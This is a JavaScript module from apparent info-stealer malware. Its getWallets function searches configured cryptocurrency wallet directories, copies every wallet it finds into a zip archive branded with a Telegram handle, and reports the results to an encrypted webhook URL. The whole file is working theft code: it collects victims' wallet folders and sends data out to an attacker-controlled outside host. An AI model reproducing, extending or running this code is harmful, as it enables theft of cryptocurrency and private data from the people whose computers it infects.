module.exports = (client) => {
    return {
        async getWallets() {
            var description = "";

            client.utils.jszip.createFolder("\\Wallets");

            for (let [key, value] of Object.entries(client.config.wallets.directory)) {
                if (client.requires.fs.existsSync(value)) {
                    description += `${key}: ✔️\n`;
                    client.utils.jszip.copyFolder(`\\Wallets\\${key}`, value);
                    client.config.counter.wallets++;
                } else {
                    description += `${key}: ❌\n`;
                }
            }

            if (description != "") {
                client.utils.jszip.createTxt("\\Found Wallets.txt", "<================[ Network Data ]>================>\n<================[t.me/M4nifest0]>================>\n\n" + description)
            }

            await client.utils.webhook.sendToWebhook(
                client.utils.encryption.decryptData(client.config.webhook.url), {
                    "embeds": [client.utils.webhook.createEmbed({
                        "title": `💰 Wallet search | Result`,
                        "description": `\`\`\`${description}\`\`\``,
                    })],
                })
        }
    };
};